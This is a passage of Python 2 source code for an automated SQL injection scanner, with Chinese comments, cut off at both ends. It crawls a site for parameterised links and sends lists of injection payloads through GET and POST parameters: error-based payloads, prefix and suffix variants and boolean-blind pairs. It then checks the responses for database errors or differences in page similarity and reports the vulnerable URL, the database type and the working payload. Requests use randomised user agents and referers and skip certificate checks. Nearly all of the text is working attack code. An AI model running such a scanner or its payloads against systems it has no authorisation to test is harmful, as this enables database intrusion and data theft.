" ' AND 7738=8291 AND 'UFqV'='UFqV", '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C",
"'and (select 1 from (select count(*),concat(database(),':',floor(rand()*2)) as a from information_schema.tables group by a)as b limit 0,1)--+")
level1_payloads = [quote(x) for x in level11_payloads]


def get_links(url):
    domain = url.split('//')[1].strip('/').replace('www.', '')
    result = []
    result_links = []
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'referer': random.choice(REFERERS),
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        rxww = requests.get(url, headers=headers, timeout=5).content
        soup = BeautifulSoup(rxww, 'html.parser')
        links = soup.findAll('a')
        for link in links:
            _url = link.get('href')
            res = re.search('(javascript|:;|#)', str(_url))
            if res == None:
                result.append(str(_url))
            else:
                pass
            res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt|db)', str(_url))
            if res1 == None:
                result.append(str(_url))
            else:
                pass

        rst = list(set(result))
        for rurl in rst:
            if '//' in rurl and 'http' in rurl:
                if domain in rurl:
                    if '?' in rurl and '=' in rurl:
                        result_links.append(rurl)
            else:
                if '?' in rurl and '=' in rurl:
                    result_links.append(url + '/' + rurl)


    except Exception, e:
        pass
    # for l in result_links:
    #     with open('url_links.txt','a+')as a:
    #         a.write(l + '\n')
    result_links = list(set(result_links))
    resulr_link_links = []
    for x in result_links:
        try:
            rez = requests.head(url=x, headers=headers, timeout=5)
            if rez.status_code == 200:
                resulr_link_links.append(x)
        except:
            pass
    if len(resulr_link_links) > 3:
        return resulr_link_links[0:3]
    if len(resulr_link_links) < 3:
        return resulr_link_links
    if resulr_link_links == []:
        return None


def diffent(url1, url2):
    headers = {
        'User-Agent': random.choice(headerss),
        'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'max-age=0',
        'referer': random.choice(REFERERS),
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
    }
    try:
        r1 = requests.get(url1, headers=headers, allow_redirects=False, verify=False, timeout=10).content
    except:
        r1 = '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    try:
        r2 = requests.get(url2, headers=headers, allow_redirects=False, verify=False, timeout=10).content
    except:
        r2 = '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
    if r1 and r2:
        dix = int(str(difflib.SequenceMatcher(None, r1, r2).quick_ratio() * 10000).split('.')[0])
        return dix
    else:
        return None
    '''返回5555这样子4位数的相似度'''


def diffent_post(url1, url2, url1_data=None, url2_data=None):
    headers = {
        'User-Agent': random.choice(headerss),
        'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'max-age=0',
        'referer': random.choice(REFERERS),
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
    }
    try:
        if url1_data == None:
            r1 = requests.get(url1, headers=headers, allow_redirects=False, verify=False, timeout=10).content
        else:
            r1 = requests.post(url1, data=url1_data, allow_redirects=False, verify=False, timeout=10).content
    except:
        r1 = '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    try:
        if url2_data == None:
            r2 = requests.get(url2, headers=headers, allow_redirects=False, verify=False, timeout=10).content
        else:
            r2 = requests.post(url2, data=url2_data, allow_redirects=False, verify=False, timeout=10).content
    except:
        r2 = '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
    if r1 and r2:
        dix = int(str(difflib.SequenceMatcher(None, r1, r2).quick_ratio() * 10000).split('.')[0])
        return dix
    else:
        return None
    '''返回5555这样子4位数的相似度'''


# url like : http://www.langzi.fun/res.php?id=5&pid=10&lov=zhao


def get_scan(url, level=1):
    url_childs = []
    url_childss = []

    result = {'url': '',
              'type': '',
              'dbms': '',
              'payload': ''}

    # 这里用来把url分割，存在列表
    if url.find('&') > 0:
        url_childs_temporary = url.split('&')
        if url.count('&') > 1:
            url_childs.append(url_childs_temporary[0] + '[INJECTION]' + url.replace(url_childs_temporary[0], ''))
            url_childss.append(url_childs_temporary[0] + '[INJECTION]' + url.replace(url_childs_temporary[0], ''))
            url_childs.append(
                url_childs_temporary[0] + ''.join(random.sample(string.digits, 6)) + '[INJECTION]' + url.replace(
                    url_childs_temporary[0], ''))
            # http://www.langzi.fun/res.php?id=5[INJECTION]&pid=10&lov=zhao


            url_childs.append(url_childs_temporary[0] + '&' + url_childs_temporary[1] + '[INJECTION]' + url.replace(
                url_childs_temporary[0], '').replace(url_childs_temporary[1], ''))
            url_childss.append(url_childs_temporary[0] + '&' + url_childs_temporary[1] + '[INJECTION]' + url.replace(
                url_childs_temporary[0], '').replace(url_childs_temporary[1], ''))
            url_childs.append(url_childs_temporary[0] + '&' + url_childs_temporary[1] + ''.join(
                random.sample(string.digits, 6)) + '[INJECTION]' + url.replace(url_childs_temporary[0], '').replace(
                url_childs_temporary[1], ''))
            # http://www.langzi.fun/res.php?id=5&pid=10[INJECTION]&lov=zhao
            url_childs.append(url + '[INJECTION]')
            url_childss.append(url + '[INJECTION]')
            url_childs.append(url + ''.join(random.sample(string.digits, 6)) + '[INJECTION]')
        else:
            url_childs.append(url_childs_temporary[0] + '[INJECTION]' + url.replace(url_childs_temporary[0], ''))
            url_childss.append(url_childs_temporary[0] + '[INJECTION]' + url.replace(url_childs_temporary[0], ''))
            url_childs.append(
                url_childs_temporary[0] + ''.join(random.sample(string.digits, 6)) + '[INJECTION]' + url.replace(
                    url_childs_temporary[0], ''))
            url_childs.append(url + '[INJECTION]')
            url_childss.append(url + '[INJECTION]')
            url_childs.append(url + ''.join(random.sample(string.digits, 6)) + '[INJECTION]')
    else:
        url_childs.append(url + '[INJECTION]')
        url_childss.append(url + '[INJECTION]')
        url_childs.append(url + ''.join(random.sample(string.digits, 6)) + '[INJECTION]')
    url_childs = list(set(url_childs))
    url_childss = list(set(url_childss))
    # # print  url_childs


    if level > 0:
        # ['?id=1[INJECTION]&idx=5','?id=1&idx=5[INJECTION]']
        # # print  '简单测试报错注入'
        # level 1 简单测试报错
        # print  'Level 1 Get_Value_Injection'
        for inj_url in url_childs:
            for url_suffix in level1_payloads:
                try:
                    headers = {
                        'User-Agent': random.choice(headerss),
                        'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Cache-Control': 'max-age=0',
                        'referer': random.choice(REFERERS),
                        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
                    }
                    r = requests.get(url=str(inj_url.replace('[INJECTION]', url_suffix)), headers=headers, verify=False,
                                     timeout=10)
                    # print  '[Level 1 Get]:' + r.url
                    for sql_error, sql_database in sql_errors.iteritems():
                        rex = re.search(sql_error, r.content)
                        if rex:
                            result['url'] = url
                            result['type'] = 'Eroror_Base_Injection'
                            result['dbms'] = sql_database
                            result['payload'] = url_suffix
                            # with open('result.txt', 'a+')as a:
                                # a.write(str(result) + '\n')
                            return result
                except Exception, e:
                    pass
                    pass
    if level > 1:
        # level 2 添加前后缀简单测试报错
        # print  'Level 2 Get_Value_Injection'
        for inj_url in url_childs:
            for url_suffix in level1_payloads:
                for x, y in pre_suf.iteritems():
                    try:
                        headers = {
                            'User-Agent': random.choice(headerss),
                            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Cache-Control': 'max-age=0',
                            'referer': random.choice(REFERERS),
                            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
                        }
                        '''
                        这里使用了前后缀，所以需要获取前后缀所需要的5个关键词
                        RADNSTR # 随机字符串 4字节
                        RANDNUM # 随机数字 随便
                        RANDSTR1# 随机字符串 4字节后面修改
                        RANDSTR2# 同上
                        ORIGINAL# 获取url中的传递参数值

                        '''
                        RANDSTR = ''.join(random.sample(string.ascii_letters, 4))
                        RANDNUM = ''.join(random.sample(string.digits, 4))
                        RANDSTR1 = ''.join(random.sample(string.ascii_letters, 4))
                        RANDSTR2 = ''.join(random.sample(string.ascii_letters, 4))
                        # ['?id=1[INJECTION]&idx=5','?id=1&idx=5[INJECTION]']
                        # ['?id=1[INJECTION]']
                        if inj_url.find('&') > 0:
                            ORIGINAL = inj_url.split('=')[1].split('[INJECTION]')[0]
                        else:
                            ORIGINAL = inj_url.split('=')[1].split('[INJECTION]')[0]
                        # 其实这两行获取结果都是一样的啊，但是显得比较严谨

                        url_temporary = str(inj_url.replace('[INJECTION]', str(
                            y['prefix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                '[RANDSTR1]',
                                RANDSTR1).replace(
                                '[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]', ORIGINAL) + \
                            url_suffix + \
                            y['suffix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                '[RANDSTR1]',
                                RANDSTR1).replace(
                                '[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]', ORIGINAL))))

                        # print  '[Level 2 Get]:' + url_temporary
                        r = requests.get(url=url_temporary, headers=headers, verify=False, timeout=10)
                        for sql_error, sql_database in sql_errors.iteritems():
                            rex = re.search(sql_error, r.content)
                            if rex:
                                result['url'] = url
                                result['type'] = 'Error_Base_Injection'
                                result['dbms'] = sql_database
                                result['payload'] = url_temporary.replace(url,'')
                                # with open('result.txt', 'a+')as a:
                                    # a.write(str(result) + '\n')
                                return result
                    except Exception, e:
                        pass
                        pass
    if level > 2:
        # print  'Level 3 Get_Value_Injection'
        # level 3 高级别的注入测试
        for inj_url in url_childs:
            for yyy, k in error_base_injection.iteritems():
                for x, y in pre_suf.iteritems():
                    try:
                        headers = {
                            'User-Agent': random.choice(headerss),
                            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Cache-Control': 'max-age=0',
                            'referer': random.choice(REFERERS),
                            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
                        }
                        '''
                        需要一些特定的参数
                        DELIMITER_START # 随机字符作为开头
                        RANDNUM # 随机数字
                        DELIMITER_STOP # 随机字符作为结尾
                        RANDNUM1 # 随机数字+1
                        RANDNUM2 # 随机数字+2
                        RANDNUM3 # 随机数字+3
                        RANDNUM4 # 随机数字+4
                        RANDNUM5 # 随机数字+5

                        '''
                        DELIMITER_START = escaper('~!')
                        DELIMITER_STOP = escaper('!~')
                        RANDNUM1 = ''.join(random.sample(string.digits, 4))
                        RANDNUM2 = ''.join(random.sample(string.digits, 4))
                        RANDNUM3 = ''.join(random.sample(string.digits, 4))
                        RANDNUM4 = ''.join(random.sample(string.digits, 4))
                        RANDNUM5 = ''.join(random.sample(string.digits, 4))
                        RANDSTR = ''.join(random.sample(string.ascii_letters, 4))
                        RANDNUM = ''.join(random.sample(string.digits, 4))
                        RANDSTR1 = ''.join(random.sample(string.ascii_letters, 4))
                        RANDSTR2 = ''.join(random.sample(string.ascii_letters, 4))
                        # ['?id=1[INJECTION]&idx=5','?id=1&idx=5[INJECTION]']
                        # ['?id=1[INJECTION]']
                        if inj_url.find('&') > 0:
                            ORIGINAL = inj_url.split('=')[1].split('[INJECTION]')[0]
                        else:
                            ORIGINAL = inj_url.split('=')[1].split('[INJECTION]')[0]
                        # 其实这两行获取结果都是一样的啊，但是显得比较严谨

                        url_temporary = str(inj_url.replace('[INJECTION]', str(
                            y['prefix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                ORIGINAL) + \
                            k['payload'].replace('[DELIMITER_START]', DELIMITER_START).replace('[DELIMITER_STOP]',
                                                                                               DELIMITER_STOP).replace(
                                '[RANDNUM]', RANDNUM).replace('[RANDNUM1]', RANDNUM1).replace(
                                '[RANDNUM2]', RANDNUM2).replace('[RANDNUM3]', RANDNUM3).replace('[RANDNUM4]',
                                                                                                RANDNUM4).replace(
                                '[RANDNUM5]', RANDNUM5
                            ) + \
                            y['suffix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                ORIGINAL))))

                        # print  '[Level 3 Get]:' + url_temporary
                        try:
                            r = requests.get(url=url_temporary, headers=headers, verify=False, timeout=10)
                        except Exception, e:
                            pass
                        # # print  k['grep'].replace('[DELIMITER_START]','!~!').replace('[DELIMITER_STOP]','!~!')
                        try:
                            rex1 = re.search(r'~!(.*?)!~', r.content)
                            rex2 = re.search(r'0x7e21(.*?)0x217e1', r.content)
                            # rex = re.search(k['grep'].replace('[DELIMITER_START]','!~!').replace('[DELIMITER_STOP]','!~!'),r.content)
                        except Exception, e:
                            pass
                        try:
                            # # print  rex1
                            if rex1:
                                result['url'] = url
                                result['type'] = 'Error_Base_Injection'
                                result['dbms'] = k['dbms']
                                result['payload'] = k['payload']
                                # with open('result.txt', 'a+')as a:
                                    # a.write(str(result) + '\n')
                                return result
                            # # print  rex2
                            if rex2:
                                result['url'] = url
                                result['type'] = 'Error_Base_Injection'
                                result['dbms'] = k['dbms']
                                result['payload'] = k['payload']
                                # with open('result.txt', 'a+')as a:
                                    # a.write(str(result) + '\n')
                                return result
                        except Exception, e:
                            pass
                        try:
                            for sql_error, sql_database in sql_errors.iteritems():
                                rex = re.search(sql_error, r.content)
                                if rex:
                                    result['url'] = url
                                    result['type'] = 'Error_Base_Injection'
                                    result['dbms'] = sql_database
                                    result['payload'] = k['payload']
                                    # with open('result.txt', 'a+')as a:
                                        # a.write(str(result) + '\n')
                                    return result
                        except Exception, e:
                            pass
                    except Exception, e:
                        pass
                        pass
    if level > 3:
        # level 4 盲注测试注入
        # print  'Level 4 Get Bool Injection'
        try:
            for inj_url in url_childss:
                for j, k in bool_blind_injection.iteritems():
                    for x, y in pre_suf.iteritems():
                        try:
                            headers = {
                                'User-Agent': random.choice(headerss),
                                'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Cache-Control': 'max-age=0',
                                'referer': random.choice(REFERERS),
                                'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3'
                            }
                            # '''
                            #        RANDNUM  # 随机数字  4字节
                            #        RANDNUM1  # 随机数字+1
                            #        RANDNUM2  # 随机数字+2
                            #        RADNSTR # 随机字符串 4字节
                            #        RANDSTR1# 随机字符串 4字节后面修改
                            #        RANDSTR2# 同上
                            #        ORIGINAL# 获取url中的传递参数值
                            #                                        '''

                            RANDNUM = ''.join(random.sample(string.digits, 4))
                            RANDNUM1 = ''.join(random.sample(string.digits, 4))
                            RANDNUM2 = ''.join(random.sample(string.digits, 4))
                            RANDSTR = ''.join(random.sample(string.ascii_letters, 4))
                            RANDSTR1 = ''.join(random.sample(string.ascii_letters, 4))
                            RANDSTR2 = ''.join(random.sample(string.ascii_letters, 4))
                            # ['?id=1[INJECTION]&idx=5','?id=1&idx=5[INJECTION]']
                            # ['?id=1[INJECTION]']
                            # RANDNUM  # 随机数字
                            # ORIGVALUE  # url中id对应值
                            # RANDNUM1  # 随机数字+1
                            # RANDSTR  # 随机字母
                            # RANDNUM2  # 随机数字+2
                            if inj_url.find('&') > 0:
                                ORIGINAL = inj_url.split('=')[1].split('[INJECTION]')[0]
                            else:
                                ORIGINAL = inj_url.split('=')[1].split('[INJECTION]')[0]
                            ORIGVALUE = inj_url.split('=')[1].split('[INJECTION]')[0]

                            url_temporary_payload = str(inj_url.replace('[INJECTION]', str(
                                y['prefix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL) + \
                                k['payload'].replace('[RANDNUM]', RANDNUM).replace('[ORIGVALUE]', ORIGVALUE).replace(
                                    '[RANDNUM1]', RANDNUM1).replace(
                                    '[RANDSTR ]', RANDSTR).replace('[RANDNUM2]', RANDNUM2) + \
                                y['suffix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL))))

                            url_temporary_comparsion = str(inj_url.replace('[INJECTION]', str(
                                y['prefix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL) + \
                                k['comparsion'].replace('[RANDNUM]', RANDNUM).replace('[ORIGVALUE]', ORIGVALUE).replace(
                                    '[RANDNUM1]', RANDNUM1).replace(
                                    '[RANDSTR ]', RANDSTR).replace('[RANDNUM2]', RANDNUM2) + \
                                y['suffix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL))))

                            '''
                        LEVEL 1 代表正请求与原始页面一样，正请求与错误页面不一样，正请求与负请求页面不一样，负请求与原始页面不一样，负请求与错误页面可能一样(有waf就一样) -->存在注入
                        LEVEL 2 代表正请求与原始页面不一样，正请求与错误页面可能不一样，正请求与负请求页面不一样，负请求与原始页面一样，负请求与错误页面不一样(有waf就一样)
                        LEVEL 3 代表正请求与原始页面一样，正请求与错误页面不一样，正请求与负请求页面不一样，负请求与原始页面不一样，负请求与错误页面可能一样(有waf就一样)
                                result['url'] = r.url
                                result['type'] = k['dbms']
                                result['sql'] = '爆错注入'
                                return result
                            原始网址：url
                            错误网址：url_error = url + ' And 1=20 or "ad"="ad" \--+'
                            正请求：url_temporary_payload
                            负请求:url_temporary_comparsion
                            '''

                            # print  '[Level 4 Get]:' + url_temporary_comparsion
                            # print  '[Level 4 Get]:' + url_temporary_payload
                            url_error = url + ' And 1=20 or "ad"="ad" \--+'
                            dix1 = diffent(url1=url, url2=url_temporary_payload)
                            # 代表原始网页与正请求
                            dix2 = diffent(url1=url, url2=url_error)
                            # 代表原始网页与错误网页
                            dix3 = diffent(url1=url, url2=url_temporary_comparsion)
                            # 代表原始网页与负请求
                            dix4 = diffent(url1=url_error, url2=url_temporary_payload)
                            # 代表错误网页与正请求
                            dix5 = diffent(url1=url_error, url2=url_temporary_comparsion)
                            # 代表错误网页与负请求
                            dix6 = diffent(url1=url_temporary_payload, url2=url_temporary_comparsion)
                            # 代表正请求与负请求
                            # # print  '原始网页与正请求' + str(dix1)
                            # # print  '原始网页与错误网页' + str(dix2)
                            # # print  '原始网页与负请求' + str(dix3)
                            # # print  '错误网页与正请求' + str(dix4)
                            # # print  '错误网页与负请求' + str(dix5)
                            # # print  '正请求与负请求' + str(dix6)
                            if dix6 < 9700:
                                if k['level'] == '1':
                                    # 错误网页与正常网页一样话，就不妙了
                                    if dix2 == 10000:
                                        # 那么只能依靠正请求与原始网页一样，正负请求不一样
                                        if dix1 > 9900 and dix6 < 9700:
                                            result['url'] = url
                                            result['type'] = 'Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                        pass
                                    else:
                                        # 如果错误网页和原始网页不一样，存在waf和不存在waf略有区别
                                        # 正请求和原始网页一样，负请求和原始网页不一样，正负请求不一样
                                        if dix1 > 9900 and dix4 < 7300 and dix3 < 7300:
                                            result['url'] = url
                                            result['type'] = 'Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                if k['level'] == '3':
                                    # 错误网页与正常网页一样话，就不妙了
                                    if dix2 == 10000:
                                        # 那么只能依靠正请求与原始网页一样，正负请求不一样
                                        if dix1 > 9900 and dix6 < 9700:
                                            result['url'] = url
                                            result['type'] = 'Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                        pass
                                    else:
                                        # 如果错误网页和原始网页不一样，存在waf和不存在waf略有区别
                                        # 正请求和原始网页一样，负请求和原始网页不一样，正负请求不一样
                                        if dix1 > 9900 and dix4 < 7300 and dix3 < 7300:
                                            result['url'] = url
                                            result['type'] = 'Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                if k['level'] == '2':
                                    '''
                                    代表正请求与原始页面不一样，正请求与错误页面可能不一样，正请求与负请求页面不一样，负请求与原始页面一样，负请求与错误页面不一样(有waf就一样)
                                    '''
                                    if dix2 == 10000:
                                        if dix1 < 7300 and dix6 < 7300 and dix3 > 9700:
                                            result['url'] = url
                                            result['type'] = 'Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                    else:
                                        if dix1 < 7300 and dix6 < 7300 and dix3 > 9700:
                                            result['url'] = url
                                            result['type'] = 'Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result

                        except Exception, e:
                            pass
        except Exception, e:
            pass

    return None


def post_scan(url, level=1):
    data_childs = []
    if url.find('?') > 0:
        url_domain = url.split('?')[0]
    else:
        return None

    result = {'url': '',
              'type': '',
              'dbms': '',
              'payload': ''}

    if url.find('&') > 0:
        url_childs_temporary = url.split('?')[1].split('&')
        data_childs.append(url_childs_temporary[0] + '[INJECTION]' + '&' + url_childs_temporary[1])
        data_childs.append(url_childs_temporary[0] + '&' + url_childs_temporary[1] + '[INJECTION]')
    else:
        data_childs.append(url.split('?')[1] + '[INJECTION]')
    data_childs = list(set(data_childs))
    # # print  data_childs
    # ['id=1[INJECTION]&ad=6', 'id=1&ad=6[INJECTION]']
    # ['id=1[INJECTION]']
    _ad = 0
    data_fathers = {}
    for x_ in data_childs:
        data_father = {}
        _ad += 1

        if '&' in x_:
            key1 = x_.split('=')[0]
            key2 = x_.split('&')[1].split('=')[0]
            value1 = x_.split('&')[0].replace(key1, '').replace('=', '')
            value2 = x_.split('&')[1].replace(key2, '').replace('=', '')
            data_father[key1] = value1
            data_father[key2] = value2
        else:
            key, value = x_.split('=')[0], x_.split('=')[1]
            data_father[key] = value
        data_fathers[str(_ad)] = data_father

    if level > 0:
        # print  'Level 1 Post Value Injection'

        # level 1 简单post 测试注入
        for f_k, f_v in data_fathers.iteritems():
            data = {}
            for url_suffix in level1_payloads:
                for i in f_v.keys():
                    data[i] = f_v[i].replace('[INJECTION]', url_suffix)
                    try:
                        headers = {
                            'User-Agent': random.choice(headerss),
                            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Cache-Control': 'max-age=0',
                            'referer': random.choice(REFERERS),
                            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3'
                        }
                        r = requests.post(url=url_domain, data=data, headers=headers, verify=False, timeout=10)
                        # print  '[Level 1 Post]:' + r.url + str(data)
                        for sql_error, sql_database in sql_errors.iteritems():
                            rex = re.search(sql_error, r.content)
                            if rex:
                                result['url'] = r.url + data[i]
                                result['type'] = 'Post_Error_Base_Injection'
                                result['dbms'] = sql_database
                                result['payload'] = str(data)
                                # with open('result.txt', 'a+')as a:
                                    # a.write(str(result) + '\n')
                                return result
                    except Exception, e:
                        pass
                        pass
    if level > 1:
        # print  'Level 2 Post Injection'
        for f_k, f_v in data_fathers.iteritems():
            try:
                data = {}
                for x0, y0 in error_base_injection.iteritems():
                    for x1, y1 in pre_suf.iteritems():
                        for i in f_v.keys():
                            DELIMITER_START = escaper('~!')
                            DELIMITER_STOP = escaper('!~')
                            RANDNUM1 = ''.join(random.sample(string.digits, 4))
                            RANDNUM2 = ''.join(random.sample(string.digits, 4))
                            RANDNUM3 = ''.join(random.sample(string.digits, 4))
                            RANDNUM4 = ''.join(random.sample(string.digits, 4))
                            RANDNUM5 = ''.join(random.sample(string.digits, 4))
                            RANDSTR = ''.join(random.sample(string.ascii_letters, 4))
                            RANDNUM = ''.join(random.sample(string.digits, 4))
                            RANDSTR1 = ''.join(random.sample(string.ascii_letters, 4))
                            RANDSTR2 = ''.join(random.sample(string.ascii_letters, 4))
                            # ['?id=1[INJECTION]&idx=5','?id=1&idx=5[INJECTION]']
                            # ['?id=1[INJECTION]']
                            ORIGINAL = f_v[i].replace('[INJECTION]', '')
                            str_data_1 = str(
                                y1['prefix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL))
                            str_data_2 = str(
                                y1['suffix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL))
                            str_data_3 = str(
                                y0['payload'].replace('[DELIMITER_START]', DELIMITER_START).replace('[DELIMITER_STOP]',
                                                                                                    DELIMITER_STOP).replace(
                                    '[RANDNUM]', RANDNUM).replace('[RANDNUM]', RANDNUM).replace('[RANDNUM1]',
                                                                                                RANDNUM1).replace(
                                    '[RANDNUM2]', RANDNUM2).replace('[RANDNUM3]', RANDNUM3).replace('[RANDNUM4]',
                                                                                                    RANDNUM4).replace(
                                    '[RANDNUM5]', RANDNUM5
                                ))
                            str_data = str_data_1 + str_data_3 + str_data_2
                            data[i] = f_v[i].replace('[INJECTION]', str_data)
                        try:
                            headers = {
                                'User-Agent': random.choice(headerss),
                                'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Cache-Control': 'max-age=0',
                                'referer': random.choice(REFERERS),
                                'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3'
                            }
                            r = requests.post(url=url_domain, data=data, headers=headers, verify=False, timeout=10)
                            # print  '[Level 2 Post]:' + r.url + str(data)
                        except Exception, e:
                            pass
                        try:
                            rex1 = re.search(r'~!(.*?)!~', r.content)
                            rex2 = re.search(r'0x7e21(.*?)0x217e1', r.content)
                        except Exception, e:
                            pass
                        try:
                            # # print  rex1
                            if rex1:
                                result['url'] = url
                                result['type'] = 'Post_Error_Base_Injection'
                                result['dbms'] = y0['dbms']
                                result['payload'] = y0['payload']
                                # with open('result.txt', 'a+')as a:
                                    # a.write(str(result) + '\n')
                                return result
                            # # print  rex2
                            if rex2:
                                result['url'] = url
                                result['type'] = 'Post_Error_Base_Injection'
                                result['dbms'] = y0['dbms']
                                result['payload'] = y0['payload']
                                # with open('result.txt', 'a+')as a:
                                    # a.write(str(result) + '\n')
                                return result
                        except Exception, e:
                            pass
                        try:
                            for sql_error, sql_database in sql_errors.iteritems():
                                rex = re.search(sql_error, r.content)
                                if rex:
                                    result['url'] = url
                                    result['type'] = 'Post_Error_Base_Injection'
                                    result['dbms'] = sql_database
                                    result['payload'] = y0['payload']
                                    return result
                        except Exception, e:
                            pass
            except Exception, e:
                pass
    if level > 2:
        # print  'Level 3 Post Bool Injection'
        try:
            for f_k, f_v in data_fathers.iteritems():
                try:
                    data_payload = {}
                    data_comparsion = {}
                    for j, k in bool_blind_injection.iteritems():
                        for x, y in pre_suf.iteritems():
                            for i in f_v.keys():
                                RANDNUM = ''.join(random.sample(string.digits, 4))
                                RANDNUM1 = ''.join(random.sample(string.digits, 4))
                                RANDNUM2 = ''.join(random.sample(string.digits, 4))
                                RANDSTR = ''.join(random.sample(string.ascii_letters, 4))
                                RANDSTR1 = ''.join(random.sample(string.ascii_letters, 4))
                                RANDSTR2 = ''.join(random.sample(string.ascii_letters, 4))
                                ORIGINAL = f_v[i].replace('[INJECTION]', '')
                                ORIGVALUE = f_v[i].replace('[INJECTION]', '')
                                data_str_01 = str(
                                    y['prefix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]', RANDNUM).replace(
                                        '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                        ORIGINAL))
                                data_str_02 = k['payload'].replace('[RANDNUM]', RANDNUM).replace('[ORIGVALUE]',
                                                                                                 ORIGVALUE).replace(
                                    '[RANDNUM1]', RANDNUM1).replace(
                                    '[RANDSTR ]', RANDSTR).replace('[RANDNUM2]', RANDNUM2)
                                data_str_02_02 = k['comparsion'].replace('[RANDNUM]', RANDNUM).replace('[ORIGVALUE]',
                                                                                                       ORIGVALUE).replace(
                                    '[RANDNUM1]', RANDNUM1).replace(
                                    '[RANDSTR ]', RANDSTR).replace('[RANDNUM2]', RANDNUM2)

                                data_str_03 = y['suffix'].replace('[RANDSTR]', RANDSTR).replace('[RANDNUM]',
                                                                                                RANDNUM).replace(
                                    '[RANDSTR1]', RANDSTR1).replace('[RANDSTR2]', RANDSTR2).replace('[ORIGINAL]',
                                                                                                    ORIGINAL)
                                data_str_pay = data_str_01 + data_str_02 + data_str_03
